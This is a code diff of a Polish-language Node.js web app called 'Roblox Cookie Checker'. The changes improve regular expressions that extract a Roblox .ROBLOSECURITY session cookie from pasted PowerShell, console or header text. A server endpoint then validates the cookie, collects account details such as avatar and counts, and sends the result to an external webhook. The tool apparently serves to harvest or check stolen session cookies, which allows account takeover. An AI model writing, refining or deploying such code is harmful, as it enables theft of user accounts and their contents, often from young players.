@@ -30,8 +30,8 @@ app.get('/', (req, res) => {
 <body>
 <div class="container">
   <h1>Roblox Cookie Checker (automatyczne wyciąganie)</h1>
-  <p>Wklej dowolny tekst zawierający cookie (logi, konsola, headers, JSON, PowerShell itp.)<br>
-  Wartość zostanie wyciągnięta automatycznie, jeśli jest pomiędzy <code>-and-items.|_</code> i <code>"</code> (lub podobnymi markerami)</p>
+  <p>Wklej dowolny tekst (PowerShell, konsola, headers, JSON itp.)<br>
+  Cookie zostanie wyciągnięte automatycznie (obsługuje formaty typu .ROBLOSECURITY w cudzysłowach, ostrzeżenia itp.)</p>
 
   <textarea id="input" placeholder="Wklej tutaj cały fragment tekstu..."></textarea>
 
@@ -53,26 +53,31 @@ async function check() {
   }
 
   // ──────────────────────────────────────────────
-  // Ulepszony regex – łapie Twój przypadek PowerShell/C#
+  // ULEPSZONY WYCIĄGACZ COOKIE – działa na Twoim przykładzie
   // ──────────────────────────────────────────────
   let cookie = null;
 
-  // Główny wzorzec – -and-items.|_ + wartość aż do najbliższego "
+  // 1. Główny wzorzec – -and-items.|_ + wartość aż do najbliższego "
   let match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
   if (match && match[1]) {
     cookie = match[1].trim();
   }
 
-  // Fallback 1 – szuka po prostu długiego ciągu zaczynającego się od _|WARNING
+  // 2. Specjalny fallback dla PowerShell / .NET cookie – szuka po ".ROBLOSECURITY", " + wartość + "
   if (!cookie) {
-    match = raw.match(/_\\|WARNING[^"]{200,}/);
-    if (match) cookie = match[0].trim();
+    match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
+    if (match && match[1]) {
+      cookie = match[1].trim();
+    }
   }
 
-  // Fallback 2 – szuka w cudzysłowach po .ROBLOSECURITY
+  // 3. Bardzo luźny fallback – szuka najdłuższego ciągu zaczynającego się od _|WARNING
   if (!cookie) {
-    match = raw.match(/"\\.ROBLOSECURITY","([^"]+)"/);
-    if (match && match[1]) cookie = match[1].trim();
+    const fallbackMatches = raw.match(/_\\|WARNING[^"]{200,}/g) || [];
+    if (fallbackMatches.length > 0) {
+      // bierz najdłuższy – najczęściej to jest ten właściwy
+      cookie = fallbackMatches.reduce((a, b) => a.length > b.length ? a : b).trim();
+    }
   }
 
   // Ostateczna walidacja
@@ -99,7 +104,7 @@ async function check() {
       return;
     }
 
-    // Wyświetl wynik lokalnie (opcjonalne)
+    // Wyświetl wynik na stronie (opcjonalne)
     let html = \`<span class="success">Konto sprawdzone i wysłane na webhook!</span><br><br>\`;
 
     if (json.avatarUrl) html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;
@@ -129,9 +134,7 @@ async function check() {
   `);
 });
 
-// ──────────────────────────────────────────────
 // Endpoint /check + wysyłka na webhook
-// ──────────────────────────────────────────────
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
@@ -290,7 +293,7 @@ app.post('/check', async (req, res) => {
       sabCount
     };
 
-    // Wysyłka na webhook (jeśli zmienna środowiskowa istnieje)
+    // Wysyłka na webhook (jeśli masz zmienną WEBHOOK w Railway)
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
